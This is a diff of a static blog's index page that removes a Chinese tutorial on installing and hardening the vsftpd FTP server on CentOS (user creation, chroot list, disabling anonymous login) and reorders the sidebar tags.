-  	<time datetime="2016-03-14T13:27:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2016-03-14</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="安装vsftpd"><a href="#安装vsftpd" class="headerlink" title="安装vsftpd"></a>安装vsftpd</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">yum install vsftpd</div></pre></td></tr></table></figure>
-<h1 id="设置开机启动"><a href="#设置开机启动" class="headerlink" title="设置开机启动"></a>设置开机启动</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">chkconfig vsftpd on</div></pre></td></tr></table></figure>
-<h1 id="启动服务"><a href="#启动服务" class="headerlink" title="启动服务"></a>启动服务</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">service vsftpd start</div></pre></td></tr></table></figure>
-<h1 id="添加用户组和用户"><a href="#添加用户组和用户" class="headerlink" title="添加用户组和用户"></a>添加用户组和用户</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">groupadd ftp</div></pre></td></tr></table></figure>
-<blockquote>
-<p>mkdir /srv/ftp/test<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">useradd -g ftp -M -d /srv/ftp/test -s /sbin/nologin test</div></pre></td></tr></table></figure></p>
-<p>-g接的是用户组<br>-M表示不设置它的主目录，假设如果没有-M，则在/home下会有跟用户名(zhujin)一样的目录。<br>-d后面接的是用zhujin登陆FTP的时候，它的初始目录。<br>-s 后面接/sbin/nologin表示用户不需要登录系统，因为我们只需要用来登陆FTP<br>zhujin表示用户名了</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">passwd <span class="built_in">test</span></div></pre></td></tr></table></figure>
-<h1 id="修改目录权限"><a href="#修改目录权限" class="headerlink" title="修改目录权限"></a>修改目录权限</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">chown -R <span class="built_in">test</span>:ftp /srv/ftp/<span class="built_in">test</span></div><div class="line">/etc/init.d/vsftpd restart</div></pre></td></tr></table></figure>
-<h1 id="相关安全设置"><a href="#相关安全设置" class="headerlink" title="相关安全设置"></a>相关安全设置</h1><blockquote>
-<p>防止跨目录<br>在/etc/vsftpd/vsftpd.conf 下添加</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">chroot_list_enable=YES</div><div class="line">chroot_list_file=/etc/vsftpd/chroot_list</div></pre></td></tr></table></figure>
-<blockquote>
-<p>把想要限制的用户写入/etc/vsftpd/chroot_list文件中再重启vsftp服务即可</p>
-<h1 id="禁止匿名登录"><a href="#禁止匿名登录" class="headerlink" title="禁止匿名登录"></a>禁止匿名登录</h1></blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">anonymous_enable=NO</div></pre></td></tr></table></figure>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">Linux</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/devops/" class="article-tag-list-link color2">devops</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/devops/Centos-vsftpd/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-
-
-
-
-
-
-
-  
   
     <nav id="page-nav">
       <a class="extend prev" rel="prev" href="/page/2/">&laquo; Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/4/">Next &raquo;</a>
@@ -1447,6 +1436,10 @@ var _hmt = _hmt || [];
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">数据处理</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">MongoDB</a>
               </li>
              
@@ -1459,15 +1452,19 @@ var _hmt = _hmt || [];
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">Python</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">SQL Server</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">Perl</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color1">TensorFlow</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">Python</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1487,11 +1484,11 @@ var _hmt = _hmt || [];
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">前端</a>
+                <a href="javascript:void(0)" class="js-tag color2">others</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">others</a>
+                <a href="javascript:void(0)" class="js-tag color3">前端</a>
               </li>
              
               <li class="article-tag-list-item">
